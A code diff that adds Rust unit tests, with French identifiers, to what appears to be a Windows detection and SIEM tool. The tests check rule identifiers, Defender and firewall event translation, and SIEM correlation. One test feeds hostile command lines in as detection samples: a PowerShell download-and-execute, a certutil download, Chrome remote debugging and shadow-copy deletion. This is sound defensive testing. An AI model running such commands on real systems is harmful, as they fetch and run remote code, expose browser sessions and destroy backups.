@@ -3138,6 +3138,118 @@ fn phase3_alerte_bornee_pire_cas() {
     assert!(octets < 16 * 1024 && octets * 1000 < TAILLE_MAX_ALERTES as usize, "pire cas : {octets} octets par alerte (promis : moins de 16 Ko)");
 }
 
+/// Phase 3.2 : registre des règles : identifiants uniques et bien formés, titres non vides ; le registre et
+/// docs/detection/regles.md listent exactement les mêmes identifiants (COR-R8 : numéro non attribué, absent du registre)
+#[test]
+fn phase3_registre_identifiants_et_documentation() {
+    use crate::regles::{identifiant_valide, regle, REGLES};
+    let mut vus = std::collections::BTreeSet::new();
+    for r in REGLES {
+        assert!(identifiant_valide(r.id), "identifiant mal formé : {}", r.id);
+        assert!(!r.titre.is_empty(), "titre vide : {}", r.id);
+        assert!(vus.insert(r.id), "identifiant en double : {}", r.id);
+        assert!(regle(r.id).is_some());
+    }
+    for mauvais in ["RES-1", "res-001", "COR-8x", "EXP-XYZ-001", "DEF-0010", "", "COR-R"] {
+        assert!(!identifiant_valide(mauvais), "{mauvais}");
+    }
+    // Identifiants de la documentation : titres de fiche (« ### ID : ») et première colonne des tableaux (« | ID | »)
+    let doc = include_str!("../../docs/detection/regles.md");
+    let mut documentes = std::collections::BTreeSet::new();
+    for l in doc.lines() {
+        let id = if let Some(t) = l.strip_prefix("### ") { t.split(" : ").next() } else if let Some(t) = l.strip_prefix("| ") { t.split(" |").next() } else { None };
+        if let Some(id) = id.map(str::trim) {
+            if identifiant_valide(id) && !l.contains("Numéro non attribué") {
+                documentes.insert(id.to_string());
+            }
+        }
+    }
+    let registre: std::collections::BTreeSet<String> = REGLES.iter().map(|r| r.id.to_string()).collect();
+    assert_eq!(registre, documentes, "registre et docs/detection/regles.md diffèrent");
+    assert!(regle("COR-R8").is_none(), "COR-R8 : numéro non attribué");
+}
+
+/// Phase 3.2 : chaque producteur d'alertes pose sa règle. Contrôle du source : chaque littéral « Alerte { » des modules
+/// de détection contient « regle: » (sauf l'aide générique d'un module, dont l'appelant passe la règle) ; puis des cas
+/// exécutés : Defender (événements et état WMI), processus (motif → règle, la plus forte d'abord)
+#[test]
+fn phase3_chaque_producteur_pose_sa_regle() {
+    let sources = [
+        ("baseline", include_str!("baseline.rs")), ("canal", include_str!("canal.rs")), ("chaines", include_str!("chaines.rs")),
+        ("defender", include_str!("defender.rs")), ("dpi", include_str!("dpi.rs")), ("hygiene", include_str!("hygiene.rs")),
+        ("ids", include_str!("ids.rs")), ("moniteur", include_str!("moniteur.rs")), ("ndr", include_str!("ndr.rs")),
+        ("parefeu", include_str!("parefeu.rs")), ("persistance", include_str!("persistance.rs")), ("processus", include_str!("processus.rs")),
+        ("protection", include_str!("protection.rs")), ("siem", include_str!("siem.rs")), ("surveillances", include_str!("surveillances.rs")),
+        ("vol_donnees", include_str!("vol_donnees.rs")),
+    ];
+    for (nom, s) in sources {
+        for (i, _) in s.match_indices("Alerte {") {
+            let avant = &s[..i];
+            if avant.ends_with("struct ") || avant.ends_with("for ") || avant.trim_end().ends_with("->") {
+                continue;
+            }
+            let fin = s[i..].find("..Default::default()").map(|f| i + f).unwrap_or(s.len());
+            assert!(s[i..fin].contains("regle:"), "{nom}.rs : alerte sans règle à l'octet {i}");
+        }
+    }
+    // Defender : événements du journal et écarts de l'état WMI
+    let xml = |id: u32, extra: &str| format!("<Event><System><EventID>{id}</EventID></System><EventData>{extra}</EventData></Event>");
+    let d = |n: &str, v: &str| format!("<Data Name='{n}'>{v}</Data>");
+    let cas = [
+        (1116, String::new(), "DEF-001"), (1117, String::new(), "DEF-002"), (5001, String::new(), "DEF-003"), (5012, String::new(), "DEF-004"),
+        (5007, d("New Value", r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\x = 0x0"), "DEF-005"),
+        (5007, d("New Value", r"HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring = 0x1"), "DEF-006"),
+        (1121, String::new(), "DEF-007"), (1124, String::new(), "DEF-008"), (1126, String::new(), "DEF-009"),
+    ];
+    for (id, extra, attendu) in cas {
+        let a = crate::defender::traduire(&xml(id, &extra)).unwrap_or_else(|| panic!("événement {id} non traduit"));
+        assert_eq!(a.regle, attendu, "événement {id}");
+    }
+    let avant = crate::defender::EtatDefender { disponible: true, temps_reel: true, protection_falsification: true, antivirus: true, ..Default::default() };
+    let apres = crate::defender::EtatDefender { disponible: true, ..Default::default() };
+    let r: Vec<String> = crate::defender::ecarts(&avant, &apres).into_iter().map(|a| a.regle).collect();
+    assert_eq!(r, ["DEF-010", "DEF-011", "DEF-012"]);
+    // Processus : la plus forte d'abord (document → interpréteur avant le motif de la ligne de commande)
+    use crate::processus::regle_retenue;
+    assert_eq!(regle_retenue(true, Some("PRC-002")), "PRC-001");
+    assert_eq!(regle_retenue(false, Some("PRC-005")), "PRC-005");
+    assert_eq!(regle_retenue(true, None), "PRC-001");
+    // Persistance : nouveau ou modifié
+    let e = crate::commun::EntreeDemarrage::default();
+    assert_eq!(crate::persistance::alerter(&e, "NOUVEAU démarrage automatique").regle, "PER-001");
+    assert_eq!(crate::persistance::alerter(&e, "démarrage automatique MODIFIÉ (avant : x)").regle, "PER-002");
+    // Pare-feu : toutes les règles supprimées par un autre auteur que Windows (SYS-003) ; règle ouverte en entrée (SYS-002)
+    let pf = |id: u32, extra: &str| format!("<Event><System><EventID>{id}</EventID></System><EventData><Data Name='RuleName'>r</Data><Data Name='ModifyingApplication'>C:\\x\\outil.exe</Data>{extra}</EventData></Event>");
+    let toutes = crate::parefeu::traduire(&pf(2059, ""), &|_| String::new()).and_then(|(_, a)| a).expect("alerte « toutes supprimées »");
+    assert_eq!(toutes.regle, "SYS-003");
+    let ouverte = crate::parefeu::traduire(&pf(2004, "<Data Name='Direction'>1</Data><Data Name='Action'>3</Data>"), &|_| String::new()).and_then(|(_, a)| a).expect("alerte règle entrante");
+    assert_eq!(ouverte.regle, "SYS-002");
+    // SIEM : R<n> → COR-R<n>, numéro non attribué → vide
+    assert_eq!(crate::siem::regle_correlation("R1"), "COR-R1");
+    assert_eq!(crate::siem::regle_correlation("R3b"), "COR-R3b");
+    assert_eq!(crate::siem::regle_correlation("R8"), "");
+    // Processus : motif de la ligne de commande → règle
+    for (ligne, attendu) in [("powershell -c iex (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')", "PRC-002"),
+                             ("certutil -urlcache -f http://203.0.113.5/a a.exe", "PRC-003"),
+                             ("chrome.exe --remote-debugging-port=9222", "PRC-004"), ("vssadmin delete shadows /all", "PRC-005")] {
+        assert_eq!(crate::processus::suspicion_regle(ligne).map(|(_, id)| id), Some(attendu), "{ligne}");
+    }
+}
+
+/// Phase 3.2 : les événements du SIEM portent le modèle (posé à l'enregistrement) et la règle de l'alerte d'origine ;
+/// une ligne NDJSON d'avant la phase 3 se relit, avec le modèle 0
+#[test]
+fn phase3_evenement_siem_modele_et_regle() {
+    use crate::siem::{evenement_de_alerte, Evenement};
+    let e = evenement_de_alerte(&crate::commun::Alerte { regle: "DEF-005".into(), niveau: "Critique".into(), ..Default::default() });
+    assert_eq!(e.regle, "DEF-005");
+    let ancienne: Evenement = serde_json::from_str(r#"{"Heure":"2026-10-20 10:00:00","Source":"alerte","Type":"detection","Niveau":"Info","Message":"m"}"#).unwrap();
+    assert!(ancienne.modele == 0 && ancienne.regle.is_empty());
+    let s = include_str!("siem.rs");
+    let d = s.find("pub fn enregistrer(").unwrap();
+    assert!(s[d..d + 300].contains("e.modele = commun::MODELE_ALERTE;"), "modèle non posé à l'enregistrement");
+}
+
 /// Phase 3.1 : une alerte d'un modèle plus récent (retour arrière) se lit, ses champs inconnus sont ignorés
 #[test]
 fn phase3_champs_inconnus_ignores() {
